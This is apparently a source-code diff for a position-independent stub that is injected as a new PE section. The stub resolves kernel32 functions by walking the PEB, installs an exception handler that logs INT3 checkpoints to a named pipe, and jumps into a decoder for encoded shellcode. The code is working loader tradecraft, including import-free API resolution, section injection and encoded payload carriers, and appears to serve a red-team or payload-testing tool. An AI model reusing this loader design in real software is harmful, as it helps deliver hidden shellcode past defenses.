@@ -7,7 +7,8 @@
  *
  * Layout when assembled into PE section:
  *   [veh_stub_code]      This compiled code
- *   [checkpoint_data]    { u32 count, {u32 offset, u8 orig_byte}[count], pipe_name\0 }
+ *   [checkpoint_data]    { u32 count, {u32 offset, u8 orig_byte}[count], pipe_name\0,
+ *                          u32 shellcode_base_rel, u64 pipe_handle_slot }
  *   [decode_stub]        XOR/SubByte/None carrier stub
  *   [key_bytes]          Encoding key (0-256 bytes)
  *   [encoded_payload]    Encoded shellcode
@@ -15,11 +16,20 @@
  * The stub:
  *   1. Resolves kernel32 APIs via PEB walk
  *   2. Opens checkpoint named pipe
- *   3. Installs VEH handler for INT3 breakpoints
- *   4. Falls through to decode stub (patched RIP-relative JMP)
+ *   3. Writes pipe handle into the data trailer for the VEH handler
+ *   4. Installs VEH handler for INT3 breakpoints
+ *   5. Falls through to decode stub (patched RIP-relative JMP)
  *
  * After decode runs and CALLs the decoded payload, INT3 breakpoints fire.
  * The VEH handler catches them, reports via pipe, restores original bytes.
+ *
+ * DESIGN: No global variables. All state is communicated through the data
+ * trailer (in the injected section). stub_entry writes runtime values
+ * (pipe handle) into the trailer. veh_handler locates the trailer via its
+ * own sentinel (0xBAADF00D) and re-resolves API function pointers via PEB walk.
+ * All helper functions are __attribute__((always_inline)) to guarantee they
+ * are inlined — ensuring stub_entry is at offset 0 of .text and there are
+ * no standalone helper functions with broken relocations after extraction.
  *
  * Build: clang -c -O2 -nostdlib -fno-stack-protector -fno-exceptions
  *        --target=x86_64-pc-windows-msvc -fms-compatibility -fms-extensions
@@ -44,9 +54,9 @@ typedef void*               LPVOID;
 typedef const char*         LPCSTR;
 typedef char*               LPSTR;
 typedef unsigned long       ULONG;
-typedef int                 BOOLEAN;
+typedef unsigned char       BOOLEAN;
 typedef unsigned long long  SIZE_T;
-typedef wchar_t             WCHAR;
+typedef unsigned short      WCHAR;
 typedef WCHAR*              PWSTR;
 
 /* List entry for PEB walk */
@@ -109,7 +119,7 @@ typedef struct _IMAGE_DATA_DIRECTORY {
 
 typedef struct _IMAGE_OPTIONAL_HEADER64 {
     WORD  Magic;
-    BYTE  filler[102];  /* skip to DataDirectory offset */
+    BYTE  filler[110];  /* skip to DataDirectory at offset 0x70 in PE32+ OptHdr */
     IMAGE_DATA_DIRECTORY DataDirectory[16];
 } IMAGE_OPTIONAL_HEADER64;
 
@@ -154,11 +164,8 @@ typedef struct _EXCEPTION_RECORD {
 } EXCEPTION_RECORD;
 
 typedef struct _CONTEXT {
-    /* Partial — we only need Rip at offset 0xF8 in the full CONTEXT.
-     * Rather than reproduce the full 1232-byte struct, we access Rip
-     * through a pointer cast in the handler. */
-    DWORD64 filler[32];  /* placeholder */
-    DWORD64 Rip;         /* not at real offset — see handler for actual access */
+    DWORD64 filler[32];
+    DWORD64 Rip;
 } CONTEXT;
 
 typedef struct _EXCEPTION_POINTERS {
@@ -193,34 +200,23 @@ typedef struct _CheckpointEntry {
 #pragma pack(pop)
 
 /* ======================================================================
- * Globals (stored in .data / .bss — will be in .text after extraction)
- * We use static vars; since this is PIC code extracted from .text,
- * the compiler will use RIP-relative addressing for these.
+ * PEB Walk helpers — ALL always_inline to avoid standalone functions
  * ====================================================================== */
 
-static HANDLE           g_pipe_handle;
-static WriteFile_t      g_WriteFile;
-static VirtualProtect_t g_VirtualProtect;
-static DWORD            g_checkpoint_count;
-static CheckpointEntry* g_checkpoint_table;
-static BYTE*            g_shellcode_base;
+/* PEB access via GS segment — AT&T syntax, no <intrin.h> dependency. */
+static __inline __attribute__((always_inline)) void* __pic_read_peb(void) {
+    void* val;
+    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(val));
+    return val;
+}
 
-/* ======================================================================
- * PEB Walk — resolve module by name (case-insensitive wchar)
- * ====================================================================== */
-
-static WCHAR to_lower_w(WCHAR c) {
+static __inline __attribute__((always_inline)) WCHAR to_lower_w(WCHAR c) {
     if (c >= L'A' && c <= L'Z') return (WCHAR)(c - L'A' + L'a');
     return c;
 }
 
-static LPVOID get_module_by_name(const WCHAR* module_name) {
-    PEB* peb;
-#if defined(_M_X64) || defined(__x86_64__)
-    peb = (PEB*)__readgsqword(0x60);
-#else
-    peb = (PEB*)__readfsdword(0x30);
-#endif
+static __inline __attribute__((always_inline)) LPVOID get_module_by_name(const WCHAR* module_name) {
+    PEB* peb = (PEB*)__pic_read_peb();
     PEB_LDR_DATA* ldr = peb->Ldr;
     LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
     LIST_ENTRY* entry = head->Flink;
@@ -247,11 +243,7 @@ static LPVOID get_module_by_name(const WCHAR* module_name) {
     return 0;
 }
 
-/* ======================================================================
- * Export resolver — find function by name in PE export table
- * ====================================================================== */
-
-static LPVOID get_func_by_name(LPVOID module, const char* func_name) {
+static __inline __attribute__((always_inline)) LPVOID get_func_by_name(LPVOID module, const char* func_name) {
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
 
@@ -275,11 +267,8 @@ static LPVOID get_func_by_name(LPVOID module, const char* func_name) {
     return 0;
 }
 
-/* ======================================================================
- * Manual integer-to-string (no snprintf in PIC)
- * ====================================================================== */
-
-static int uint_to_str(char* buf, unsigned int val) {
+/* Manual integer-to-string (no snprintf in PIC) */
+static __inline __attribute__((always_inline)) int uint_to_str(char* buf, unsigned int val) {
     char tmp[12];
     int len = 0;
     if (val == 0) { buf[0] = '0'; return 1; }
@@ -292,40 +281,193 @@ static int uint_to_str(char* buf, unsigned int val) {
     return len;
 }
 
-static int str_copy(char* dst, const char* src) {
+static __inline __attribute__((always_inline)) int str_copy(char* dst, const char* src) {
     int i = 0;
     while (src[i]) { dst[i] = src[i]; i++; }
     return i;
 }
 
 /* ======================================================================
- * VEH Handler — catches INT3 in shellcode region
+ * Helper: locate the data trailer end fields from a data_ptr
+ *
+ * Data trailer layout:
+ *   [u32 count]
+ *   [count × {u32 offset, u8 orig_byte}]   (5 bytes each)
+ *   [pipe_name\0]
+ *   [u32 shellcode_base_rel]
+ *   [u64 pipe_handle_slot]                  ← NEW: written by stub_entry
  * ====================================================================== */
 
-/*
- * CONTEXT layout on x64 Windows (from winnt.h):
- * Rip is at offset 0xF8 (248) in the full CONTEXT structure.
- * We access it via raw byte pointer to avoid reproducing the full struct.
- */
+/* Walk from data_ptr to find pipe_handle_slot pointer */
+static __inline __attribute__((always_inline)) void parse_trailer(
+    BYTE* data_ptr,
+    DWORD* out_count,
+    CheckpointEntry** out_table,
+    BYTE** out_shellcode_base,
+    HANDLE* out_pipe_handle,
+    BYTE** out_pipe_handle_slot
+) {
+    DWORD count = *(DWORD*)data_ptr;
+    CheckpointEntry* table = (CheckpointEntry*)(data_ptr + 4);
+    char* pipe_name = (char*)(data_ptr + 4 + count * sizeof(CheckpointEntry));
+
+    /* Walk past pipe_name null terminator */
+    char* p = pipe_name;
+    while (*p) p++;
+    p++; /* skip null */
+
+    /* shellcode_base_rel */
+    DWORD shellcode_base_rel = *(DWORD*)p;
+    p += 4;
+
+    /* pipe_handle_slot (u64) */
+    BYTE* handle_slot = (BYTE*)p;
+    HANDLE pipe_handle = *(HANDLE*)p;
+
+    if (out_count) *out_count = count;
+    if (out_table) *out_table = table;
+    if (out_shellcode_base) *out_shellcode_base = data_ptr + shellcode_base_rel;
+    if (out_pipe_handle) *out_pipe_handle = pipe_handle;
+    if (out_pipe_handle_slot) *out_pipe_handle_slot = handle_slot;
+}
+
+/* ======================================================================
+ * Forward-declare veh_handler (defined after stub_entry)
+ * ====================================================================== */
+
+static LONG __stdcall veh_handler(EXCEPTION_POINTERS* ep);
+
+/* ======================================================================
+ * Stub entry point — MUST be the first function in .text (offset 0)
+ *
+ * After setup, falls through to the decode stub via a JMP whose
+ * displacement is patched by Rust at assembly time.
+ *
+ * Sentinel values for Rust to find and patch:
+ *   0xDEADBEEF — LEA displacement pointing to checkpoint data trailer
+ *   0xCAFEBABE — JMP displacement to decode stub
+ * ====================================================================== */
+
+__attribute__((section(".text")))
+void stub_entry(void) {
+    /* --- PEB walk: resolve kernel32.dll --- */
+    WCHAR k32_name[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l', 0 };
+    LPVOID k32 = get_module_by_name(k32_name);
+    if (!k32) goto skip_veh;
+
+    /* --- Resolve APIs --- */
+    char s_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
+    char s_WriteFile[]   = { 'W','r','i','t','e','F','i','l','e', 0 };
+    char s_VirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };
+    char s_AddVEH[]      = { 'A','d','d','V','e','c','t','o','r','e','d',
+                             'E','x','c','e','p','t','i','o','n',
+                             'H','a','n','d','l','e','r', 0 };
+
+    CreateFileA_t pCreateFileA = (CreateFileA_t)get_func_by_name(k32, s_CreateFileA);
+    WriteFile_t pWriteFile     = (WriteFile_t)get_func_by_name(k32, s_WriteFile);
+    VirtualProtect_t pVP       = (VirtualProtect_t)get_func_by_name(k32, s_VirtualProtect);
+    AddVectoredExceptionHandler_t pAddVEH =
+        (AddVectoredExceptionHandler_t)get_func_by_name(k32, s_AddVEH);
+
+    if (!pCreateFileA || !pWriteFile || !pVP || !pAddVEH)
+        goto skip_veh;
+
+    /* --- Locate checkpoint data via sentinel LEA (0xDEADBEEF) --- */
+    {
+        BYTE* data_ptr;
+        __asm__ volatile (
+            ".byte 0x48, 0x8D, 0x05, 0xEF, 0xBE, 0xAD, 0xDE\n"
+            "movq %%rax, %0\n"
+            : "=r"(data_ptr)
+            :
+            : "rax"
+        );
+
+        /* Parse trailer */
+        DWORD chk_count;
+        CheckpointEntry* chk_table;
+        BYTE* shellcode_base;
+        BYTE* pipe_handle_slot;
+        parse_trailer(data_ptr, &chk_count, &chk_table, &shellcode_base, 0, &pipe_handle_slot);
+
+        /* Get pipe_name from trailer */
+        char* pipe_name = (char*)(data_ptr + 4 + chk_count * sizeof(CheckpointEntry));
+
+        /* Open checkpoint pipe */
+        HANDLE pipe_handle = pCreateFileA(
+            pipe_name,
+            GENERIC_WRITE,
+            0,     /* no sharing */
+            0,     /* no security */
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            0      /* no template */
+        );
+
+        /* Write pipe handle into the trailer slot for veh_handler to read */
+        *(HANDLE*)pipe_handle_slot = pipe_handle;
+
+        /* Install VEH handler (first in chain) */
+        pAddVEH(1, (void*)veh_handler);
+    }
+
+skip_veh:
+    /* --- Jump to decode stub --- */
+    /* JMP rel32 with displacement 0xCAFEBABE = E9 BE BA FE CA */
+    __asm__ volatile (
+        ".byte 0xE9, 0xBE, 0xBA, 0xFE, 0xCA\n"
+    );
+
+    __builtin_unreachable();
+}
+
+/* ======================================================================
+ * VEH Handler — catches INT3 in shellcode region
+ *
+ * Locates the data trailer via its OWN sentinel (0xBAADF00D).
+ * Re-resolves WriteFile and VirtualProtect via PEB walk each time
+ * (the helpers are always_inline so they're inlined here).
+ * Reads pipe_handle from the extended trailer slot.
+ *
+ * CONTEXT layout on x64 Windows: Rip is at offset 0xF8.
+ * ====================================================================== */
+
 #define CONTEXT_RIP_OFFSET 0xF8
 
 static LONG __stdcall veh_handler(EXCEPTION_POINTERS* ep) {
     if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_BREAKPOINT)
         return EXCEPTION_CONTINUE_SEARCH;
 
-    if (!g_shellcode_base || !g_checkpoint_table)
+    /* --- Locate data trailer via sentinel LEA (0xBAADF00D) --- */
+    BYTE* data_ptr;
+    __asm__ volatile (
+        ".byte 0x48, 0x8D, 0x05, 0x0D, 0xF0, 0xAD, 0xBA\n"
+        "movq %%rax, %0\n"
+        : "=r"(data_ptr)
+        :
+        : "rax"
+    );
+
+    /* Parse trailer to get checkpoint data and pipe handle */
+    DWORD chk_count;
+    CheckpointEntry* chk_table;
+    BYTE* shellcode_base;
+    HANDLE pipe_handle;
+    parse_trailer(data_ptr, &chk_count, &chk_table, &shellcode_base, &pipe_handle, 0);
+
+    if (!shellcode_base || !chk_table)
         return EXCEPTION_CONTINUE_SEARCH;
 
     ULONG_PTR exc_addr = (ULONG_PTR)ep->ExceptionRecord->ExceptionAddress;
-    ULONG_PTR base = (ULONG_PTR)g_shellcode_base;
+    ULONG_PTR base = (ULONG_PTR)shellcode_base;
 
     if (exc_addr < base)
         return EXCEPTION_CONTINUE_SEARCH;
 
     DWORD offset = (DWORD)(exc_addr - base);
 
-    for (DWORD i = 0; i < g_checkpoint_count; i++) {
-        if (g_checkpoint_table[i].offset == offset) {
+    for (DWORD i = 0; i < chk_count; i++) {
+        if (chk_table[i].offset == offset) {
             /* Build JSON on stack:
              * {"ts_us":0,"checkpoint":"sc_checkpoint_N","type":"artifact_checkpoint"}\n */
             char json[128];
@@ -334,18 +476,35 @@ static LONG __stdcall veh_handler(EXCEPTION_POINTERS* ep) {
             pos += uint_to_str(json + pos, i);
             pos += str_copy(json + pos, "\",\"type\":\"artifact_checkpoint\"}\n");
 
-            /* Write to pipe (best-effort — don't fail execution if pipe is gone) */
-            if (g_pipe_handle && g_pipe_handle != INVALID_HANDLE_VALUE && g_WriteFile) {
-                DWORD written;
-                g_WriteFile(g_pipe_handle, json, (DWORD)pos, &written, 0);
+            /* Write to pipe (best-effort — skip if no pipe server) */
+            if (pipe_handle && pipe_handle != INVALID_HANDLE_VALUE) {
+                WCHAR k32w_name[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l', 0 };
+                LPVOID k32w = get_module_by_name(k32w_name);
+                if (k32w) {
+                    char s_WF[] = { 'W','r','i','t','e','F','i','l','e', 0 };
+                    WriteFile_t pWF = (WriteFile_t)get_func_by_name(k32w, s_WF);
+                    if (pWF) {
+                        DWORD written;
+                        pWF(pipe_handle, json, (DWORD)pos, &written, 0);
+                    }
+                }
             }
 
-            /* Restore original byte */
-            if (g_VirtualProtect) {
-                DWORD old_protect;
-                g_VirtualProtect((LPVOID)exc_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect);
-                *(BYTE*)exc_addr = g_checkpoint_table[i].orig_byte;
-                g_VirtualProtect((LPVOID)exc_addr, 1, old_protect, &old_protect);
+            /* ALWAYS restore original byte — must happen even without pipe,
+             * otherwise the INT3 fires again in an infinite loop. */
+            {
+                WCHAR k32r_name[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l', 0 };
+                LPVOID k32r = get_module_by_name(k32r_name);
+                if (k32r) {
+                    char s_VP[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };
+                    VirtualProtect_t pVP = (VirtualProtect_t)get_func_by_name(k32r, s_VP);
+                    if (pVP) {
+                        DWORD old_protect;
+                        pVP((LPVOID)exc_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect);
+                        *(BYTE*)exc_addr = chk_table[i].orig_byte;
+                        pVP((LPVOID)exc_addr, 1, old_protect, &old_protect);
+                    }
+                }
             }
 
             /* Resume at the restored instruction */
@@ -356,127 +515,4 @@ static LONG __stdcall veh_handler(EXCEPTION_POINTERS* ep) {
     }
 
     return EXCEPTION_CONTINUE_SEARCH;
-}
-
-/* ======================================================================
- * Stub entry point
- *
- * Called when execution is redirected to the injected section.
- * After setup, falls through to the decode stub via a JMP whose
- * displacement is patched by Rust at assembly time.
- * ====================================================================== */
-
-/*
- * Sentinel values for Rust to find and patch:
- *   0xDEADBEEF — LEA displacement pointing to checkpoint data trailer
- *   0xCAFEBABE — JMP displacement to decode stub
- *
- * These appear as disp32 operands in RIP-relative LEA/JMP instructions.
- * The Rust assembler scans for them with iced-x86 and patches in the
- * correct offsets based on the assembled section layout.
- */
-
-__attribute__((section(".text")))
-void stub_entry(void) {
-    /* Align RSP for Win64 ABI */
-    /* (The compiler handles this via function prologue) */
-
-    /* --- PEB walk: resolve kernel32.dll --- */
-    WCHAR k32_name[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l', 0 };
-    LPVOID k32 = get_module_by_name(k32_name);
-    if (!k32) goto skip_veh;
-
-    /* --- Resolve 5 APIs --- */
-    char s_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
-    char s_WriteFile[]   = { 'W','r','i','t','e','F','i','l','e', 0 };
-    char s_VirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };
-    char s_AddVEH[]      = { 'A','d','d','V','e','c','t','o','r','e','d',
-                             'E','x','c','e','p','t','i','o','n',
-                             'H','a','n','d','l','e','r', 0 };
-    char s_RemoveVEH[]   = { 'R','e','m','o','v','e','V','e','c','t','o','r','e','d',
-                             'E','x','c','e','p','t','i','o','n',
-                             'H','a','n','d','l','e','r', 0 };
-
-    CreateFileA_t pCreateFileA = (CreateFileA_t)get_func_by_name(k32, s_CreateFileA);
-    g_WriteFile     = (WriteFile_t)get_func_by_name(k32, s_WriteFile);
-    g_VirtualProtect = (VirtualProtect_t)get_func_by_name(k32, s_VirtualProtect);
-    AddVectoredExceptionHandler_t pAddVEH =
-        (AddVectoredExceptionHandler_t)get_func_by_name(k32, s_AddVEH);
-
-    if (!pCreateFileA || !g_WriteFile || !g_VirtualProtect || !pAddVEH)
-        goto skip_veh;
-
-    /* --- Locate checkpoint data via sentinel LEA --- */
-    {
-        /*
-         * The compiler emits: lea rax, [rip + 0xDEADBEEF]
-         * Rust patches the disp32 to point to the checkpoint data trailer.
-         */
-        BYTE* data_ptr;
-        __asm__ volatile (
-            "lea %0, [rip + 0xDEADBEEF]"  /* sentinel — patched by Rust */
-            : "=r"(data_ptr)
-        );
-
-        /* Parse checkpoint data trailer:
-         *   [u32 count] [count * {u32 offset, u8 orig_byte}] [pipe_name\0] */
-        g_checkpoint_count = *(DWORD*)data_ptr;
-        g_checkpoint_table = (CheckpointEntry*)(data_ptr + 4);
-        char* pipe_name = (char*)(data_ptr + 4 + g_checkpoint_count * sizeof(CheckpointEntry));
-
-        /* Open checkpoint pipe */
-        g_pipe_handle = pCreateFileA(
-            pipe_name,
-            GENERIC_WRITE,
-            0,     /* no sharing */
-            0,     /* no security */
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            0      /* no template */
-        );
-
-        /* Install VEH handler (first in chain) */
-        pAddVEH(1, (void*)veh_handler);
-
-        /*
-         * Compute shellcode base address.
-         * After the decode stub runs, the decoded shellcode (with INT3s) lives
-         * at the encoded_payload location. We compute that from our data pointer:
-         *   shellcode_base = pipe_name + strlen(pipe_name) + 1 + decode_stub_size + key_size
-         * But we don't know those sizes here. Instead, Rust patches g_shellcode_base
-         * into a known location, OR we set it after computing from the section layout.
-         *
-         * Simpler approach: Rust writes the shellcode_base_offset into the data trailer
-         * as an additional field after pipe_name. But that changes the format.
-         *
-         * Simplest: the decode stub is located right after pipe_name. After decode runs
-         * in-place, the payload region starts at a known offset from data_ptr.
-         * Rust computes this offset and stores it as a u32 after pipe_name.
-         *
-         * Data trailer format (updated):
-         *   [u32 count] [{u32,u8}*count] [pipe_name\0] [u32 shellcode_base_rel]
-         *
-         * shellcode_base_rel = offset from data_ptr to the start of (decoded) payload.
-         */
-        /* Find end of pipe_name */
-        char* p = pipe_name;
-        while (*p) p++;
-        p++; /* skip null terminator */
-        DWORD shellcode_base_rel = *(DWORD*)p;
-        g_shellcode_base = data_ptr + shellcode_base_rel;
-    }
-
-skip_veh:
-    /* --- Jump to decode stub --- */
-    /*
-     * The compiler emits: jmp [rip + 0xCAFEBABE]
-     * Rust patches the displacement to jump to the decode stub.
-     * We use inline asm to guarantee the sentinel appears.
-     */
-    __asm__ volatile (
-        "jmp 0xCAFEBABE"  /* sentinel — patched by Rust to decode stub offset */
-    );
-
-    /* Unreachable — silences compiler warnings */
-    __builtin_unreachable();
 }
